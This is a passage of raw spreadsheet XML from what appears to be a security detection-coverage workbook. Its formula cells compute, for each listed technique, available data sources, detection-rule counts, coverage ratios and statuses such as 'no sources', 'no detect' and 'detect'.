      <c r="P103" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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03" t="s">
        <v>386</v>
      </c>
      <c r="U103" t="s">
        <v>793</v>
      </c>
      <c r="V103" t="s">
        <v>794</v>
      </c>
      <c r="W103" t="b">
        <v>1</v>
      </c>
      <c r="X103" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="104" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A104" t="s">
        <v>746</v>
      </c>
      <c r="B104" t="s">
        <v>795</v>
      </c>
      <c r="C104" t="s">
        <v>796</v>
      </c>
      <c r="D104" t="s">
        <v>747</v>
      </c>
      <c r="E104" t="s">
        <v>797</v>
      </c>
      <c r="F104" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G104" s="9" cm="1">
        <f t="array" ref="G104">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H104" s="9" t="str" cm="1">
        <f t="array" ref="H104">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I104" s="9" t="str" cm="1">
        <f t="array" ref="I104">IF(SUM(IF($C104=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C104=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J104" s="9" t="str" cm="1">
        <f t="array" ref="J10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04" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M104" s="9" cm="1">
        <f t="array" ref="M104">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N104" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O104" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P104" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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04" t="s">
        <v>416</v>
      </c>
      <c r="U104" t="s">
        <v>798</v>
      </c>
      <c r="V104" t="s">
        <v>799</v>
      </c>
      <c r="W104" t="b">
        <v>1</v>
      </c>
      <c r="X104" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="105" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A105" t="s">
        <v>746</v>
      </c>
      <c r="B105" t="s">
        <v>800</v>
      </c>
      <c r="C105" t="s">
        <v>801</v>
      </c>
      <c r="D105" t="s">
        <v>747</v>
      </c>
      <c r="E105" t="s">
        <v>802</v>
      </c>
      <c r="F105" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G105" s="9" cm="1">
        <f t="array" ref="G105">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H105" s="9" t="str" cm="1">
        <f t="array" ref="H105">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I105" s="9" t="str" cm="1">
        <f t="array" ref="I105">IF(SUM(IF($C105=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C105=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J105" s="9" t="str" cm="1">
        <f t="array" ref="J10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05" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M105" s="9" cm="1">
        <f t="array" ref="M105">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N105" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O105" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P105" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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05" t="s">
        <v>386</v>
      </c>
      <c r="U105" t="s">
        <v>803</v>
      </c>
      <c r="V105" t="s">
        <v>804</v>
      </c>
      <c r="W105" t="b">
        <v>1</v>
      </c>
      <c r="X105" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="106" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A106" t="s">
        <v>805</v>
      </c>
      <c r="B106" t="s">
        <v>805</v>
      </c>
      <c r="C106" t="s">
        <v>95</v>
      </c>
      <c r="D106" t="s">
        <v>806</v>
      </c>
      <c r="E106" t="s">
        <v>807</v>
      </c>
      <c r="F106" s="9">
        <f t="shared" si="1"/>
        <v>6</v>
      </c>
      <c r="G106" s="9" cm="1">
        <f t="array" ref="G106">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H106" s="9" cm="1">
        <f t="array" ref="H106">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I106" s="9" t="str" cm="1">
        <f t="array" ref="I106">IF(SUM(IF($C106=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C106=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J106" s="9" cm="1">
        <f t="array" ref="J10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106" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M106" s="9" cm="1">
        <f t="array" ref="M106">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N106" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O106" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P106" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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06" t="s">
        <v>425</v>
      </c>
      <c r="U106" t="s">
        <v>808</v>
      </c>
      <c r="V106" t="s">
        <v>809</v>
      </c>
      <c r="W106" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="107" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A107" t="s">
        <v>805</v>
      </c>
      <c r="B107" t="s">
        <v>810</v>
      </c>
      <c r="C107" t="s">
        <v>283</v>
      </c>
      <c r="D107" t="s">
        <v>806</v>
      </c>
      <c r="E107" t="s">
        <v>811</v>
      </c>
      <c r="F107" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G107" s="9" cm="1">
        <f t="array" ref="G107">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H107" s="9" t="str" cm="1">
        <f t="array" ref="H107">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I107" s="9" t="str" cm="1">
        <f t="array" ref="I107">IF(SUM(IF($C107=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C107=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J107" s="9" t="str" cm="1">
        <f t="array" ref="J10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07" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M107" s="9" cm="1">
        <f t="array" ref="M107">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N107" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O107" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P107" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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07" t="s">
        <v>425</v>
      </c>
      <c r="U107" t="s">
        <v>812</v>
      </c>
      <c r="V107" t="s">
        <v>813</v>
      </c>
      <c r="W107" t="b">
        <v>1</v>
      </c>
      <c r="X107" t="s">
        <v>805</v>
      </c>
    </row>
    <row r="108" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A108" t="s">
        <v>805</v>
      </c>
      <c r="B108" t="s">
        <v>814</v>
      </c>
      <c r="C108" t="s">
        <v>259</v>
      </c>
      <c r="D108" t="s">
        <v>806</v>
      </c>
      <c r="E108" t="s">
        <v>815</v>
      </c>
      <c r="F108" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G108" s="9" cm="1">
        <f t="array" ref="G108">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H108" s="9" t="str" cm="1">
        <f t="array" ref="H108">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I108" s="9" t="str" cm="1">
        <f t="array" ref="I108">IF(SUM(IF($C108=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C108=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J108" s="9" t="str" cm="1">
        <f t="array" ref="J10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08" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M108" s="9" cm="1">
        <f t="array" ref="M108">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N108" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O108" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P108" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S10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08" t="s">
        <v>368</v>
      </c>
      <c r="U108" t="s">
        <v>816</v>
      </c>
      <c r="V108" t="s">
        <v>817</v>
      </c>
      <c r="W108" t="b">
        <v>1</v>
      </c>
      <c r="X108" t="s">
        <v>805</v>
      </c>
    </row>
    <row r="109" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A109" t="s">
        <v>805</v>
      </c>
      <c r="B109" t="s">
        <v>818</v>
      </c>
      <c r="C109" t="s">
        <v>819</v>
      </c>
      <c r="D109" t="s">
        <v>806</v>
      </c>
      <c r="E109" t="s">
        <v>777</v>
      </c>
      <c r="F109" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G109" s="9" cm="1">
        <f t="array" ref="G109">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H109" s="9" t="str" cm="1">
        <f t="array" ref="H109">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I109" s="9" t="str" cm="1">
        <f t="array" ref="I109">IF(SUM(IF($C109=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C109=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J109" s="9" t="str" cm="1">
        <f t="array" ref="J10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09" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M109" s="9" cm="1">
        <f t="array" ref="M109">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N109" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O109" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P109" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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09" t="s">
        <v>368</v>
      </c>
      <c r="U109" t="s">
        <v>820</v>
      </c>
      <c r="V109" t="s">
        <v>821</v>
      </c>
      <c r="W109" t="b">
        <v>1</v>
      </c>
      <c r="X109" t="s">
        <v>805</v>
      </c>
    </row>
    <row r="110" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A110" t="s">
        <v>805</v>
      </c>
      <c r="B110" t="s">
        <v>822</v>
      </c>
      <c r="C110" t="s">
        <v>284</v>
      </c>
      <c r="D110" t="s">
        <v>806</v>
      </c>
      <c r="E110" t="s">
        <v>823</v>
      </c>
      <c r="F110" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G110" s="9" cm="1">
        <f t="array" ref="G110">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H110" s="9" t="str" cm="1">
        <f t="array" ref="H110">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I110" s="9" t="str" cm="1">
        <f t="array" ref="I110">IF(SUM(IF($C110=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C110=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J110" s="9" t="str" cm="1">
        <f t="array" ref="J11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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M110" s="9" cm="1">
        <f t="array" ref="M110">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N110" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O110" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P110" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S11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10" t="s">
        <v>386</v>
      </c>
      <c r="U110" t="s">
        <v>824</v>
      </c>
      <c r="V110" t="s">
        <v>825</v>
      </c>
      <c r="W110" t="b">
        <v>1</v>
      </c>
      <c r="X110" t="s">
        <v>805</v>
      </c>
    </row>
    <row r="111" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A111" t="s">
        <v>826</v>
      </c>
      <c r="B111" t="s">
        <v>826</v>
      </c>
      <c r="C111" t="s">
        <v>188</v>
      </c>
      <c r="D111" t="s">
        <v>8</v>
      </c>
      <c r="E111" t="s">
        <v>434</v>
      </c>
      <c r="F111" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G111" s="9" cm="1">
        <f t="array" ref="G111">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H111" s="9" cm="1">
        <f t="array" ref="H111">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I111" s="9" t="str" cm="1">
        <f t="array" ref="I111">IF(SUM(IF($C111=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C111=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J111" s="9" t="str" cm="1">
        <f t="array" ref="J11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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M111" s="9" cm="1">
        <f t="array" ref="M111">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N111" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O111" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P111" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S11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11" t="s">
        <v>425</v>
      </c>
      <c r="U111" t="s">
        <v>827</v>
      </c>
      <c r="V111" t="s">
        <v>828</v>
      </c>
      <c r="W111" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="112" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A112" t="s">
        <v>829</v>
      </c>
      <c r="B112" t="s">
        <v>829</v>
      </c>
      <c r="C112" t="s">
        <v>29</v>
      </c>
      <c r="D112" t="s">
        <v>3</v>
      </c>
      <c r="E112" t="s">
        <v>830</v>
      </c>
      <c r="F112" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G112" s="9" cm="1">
        <f t="array" ref="G112">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H112" s="9" cm="1">
        <f t="array" ref="H112">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>11</v>
      </c>
      <c r="I112" s="9" t="str" cm="1">
        <f t="array" ref="I112">IF(SUM(IF($C112=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C112=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J112" s="9" cm="1">
        <f t="array" ref="J11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1</v>
      </c>
      <c r="K112" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>11</v>
      </c>
      <c r="M112" s="9" cm="1">
        <f t="array" ref="M112">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>11</v>
      </c>
      <c r="N112" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O112" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>9.0909090909090912E-2</v>
      </c>
      <c r="P112" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S11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12" t="s">
        <v>831</v>
      </c>
      <c r="U112" t="s">
        <v>832</v>
      </c>
      <c r="V112" t="s">
        <v>833</v>
      </c>
      <c r="W112" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="113" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A113" t="s">
        <v>829</v>
      </c>
      <c r="B113" t="s">
        <v>834</v>
      </c>
      <c r="C113" t="s">
        <v>236</v>
      </c>
      <c r="D113" t="s">
        <v>3</v>
      </c>
      <c r="E113" t="s">
        <v>830</v>
      </c>
      <c r="F113" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G113" s="9" cm="1">
        <f t="array" ref="G113">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H113" s="9" t="str" cm="1">
